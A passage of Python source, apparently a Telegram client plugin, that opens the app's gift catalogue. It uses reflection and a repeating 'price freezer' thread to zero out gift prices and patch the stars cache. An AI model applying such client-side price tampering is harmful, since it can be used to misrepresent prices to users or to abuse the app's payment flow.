                        f.setAccessible(True)
                        lst = f.get(sheet)
                        if lst and hasattr(lst, "size"):
                            self._zero_out_list(lst)
                    except Exception:
                        pass
            except Exception:
                pass

    def _start_price_freezer(self, account: int, sheet):
        def freezer_task():
            for _ in range(50):
                time.sleep(0.1)
                try:
                    run_on_ui_thread(lambda: self._apply_zero_patches(account, sheet))
                except Exception:
                    break
            for _ in range(30):
                time.sleep(0.5)
                try:
                    run_on_ui_thread(lambda: self._apply_zero_patches(account, sheet))
                except Exception:
                    break

        threading.Thread(target=freezer_task, daemon=True).start()

    # ---------- UI и открытие меню ----------

    def _create_and_show_sheet(self, GiftSheet, context, account, user_id, options):
        self._log(f"[SHEET] _create_and_show_sheet: user_id={user_id} options={'есть' if options else 'None'}")
        try:
            sheet = GiftSheet(context, account, user_id, options, None)
            self._log("[SHEET] GiftSheet создан, вызываю show()")
            sheet.show()
            self._current_sheet = sheet
            self._log("[SHEET] sheet.show() выполнен, каталог должен быть на экране")
            self._start_price_freezer(account, sheet)
            
            self._hook_ui_elements(sheet, context)
            
        except Exception as e:
            self._log_exc("_create_and_show_sheet", e)

    def show_gift_ui(self, account: int, user):
        from java import jclass, dynamic_proxy

        self._log(f"[SHOW] show_gift_ui: account={account} user_id={user.id}")

        fragment = get_last_fragment()
        if fragment is None:
            self._log("[SHOW] ОШИБКА: fragment is None")
            return
        context = fragment.getParentActivity()
        if context is None:
            self._log("[SHOW] ОШИБКА: getParentActivity() is None")
            return

        try:
            GiftSheet = jclass("org.telegram.ui.Gifts.GiftSheet")
            self._log("[SHOW] Класс GiftSheet найден")
        except Exception as e:
            self._log(f"[SHOW] Класс org.telegram.ui.Gifts.GiftSheet НЕ найден ({e}), пробую fallback на профиль")
            self._open_profile_fallback(fragment, user)
            return

        self._patch_stars_controller_cache(account)

        loaded_via_repo = False
        for class_path in BOOST_REPOSITORY_CANDIDATES:
            try:
                Repo = jclass(class_path)
                CallbackIface = jclass(class_path + "$OnGiftOptionsLoaded")
                self._log(f"[SHOW] Найден репозиторий: {class_path}, загружаю опции подарков")

                class OptionsCallback(dynamic_proxy(CallbackIface)):
                    def onGiftOptionsLoaded(self_inner, options):
                        try:
                            self._log(f"[SHOW] onGiftOptionsLoaded вызван, options={'есть' if options else 'None'}")
                            self._zero_out_list(options)
                            run_on_ui_thread(lambda: self._create_and_show_sheet(GiftSheet, context, account, user.id, options))
                        except Exception as e:
                            self._log_exc("onGiftOptionsLoaded", e)

                Repo.loadGiftOptions(account, None, OptionsCallback())
                loaded_via_repo = True
                return
            except Exception as e:
                self._log(f"[SHOW] Репозиторий {class_path} недоступен: {e}")

        if not loaded_via_repo:
            self._log("[SHOW] Ни один BOOST_REPOSITORY не найден, открываю sheet без опций (options=None)")
        self._create_and_show_sheet(GiftSheet, context, account, user.id, None)

    def _open_profile_fallback(self, fragment, user):
        try:
            from java import jclass
            ProfileActivity = jclass("org.telegram.ui.ProfileActivity")
            Bundle = jclass("android.os.Bundle")
            args = Bundle()
            args.putLong("user_id", user.id)
            fragment.presentFragment(ProfileActivity(args))
        except Exception as e:
            self._log_exc("_open_profile_fallback", e)

    def create_settings(self) -> List[Any]:
        return [
            Header(text="Gift Menu"),
            Text(text="Показать логи", icon="msg_log", on_click=self._show_logs_dialog),
        ]

    def _show_logs_dialog(self, view):
        context = view.getContext()
        full_text = "\n".join(self._logs) if self._logs else "Логов пока нет."
        builder = AlertDialogBuilder(context)
        builder.set_title("Логи gift_menu")
        builder.set_message(full_text)
        builder.set_positive_button("Закрыть", lambda b, w: b.dismiss())
        builder.show()
